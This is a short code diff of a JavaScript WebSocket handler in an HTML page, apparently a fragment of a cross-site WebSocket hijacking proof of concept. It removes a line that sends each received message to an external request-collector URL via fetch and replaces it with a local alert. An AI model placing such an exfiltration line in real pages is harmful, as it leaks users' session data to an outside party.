@@ -6,6 +6,6 @@ function start(event) {
   websocket.send("READY");
 }
 function handleReply(event) {
-  fetch('https://enk07di81lhen.x.pipedream.net/?'+event.data, {mode: 'no-cors'})
+  alert(event.data);
 }
 </script>
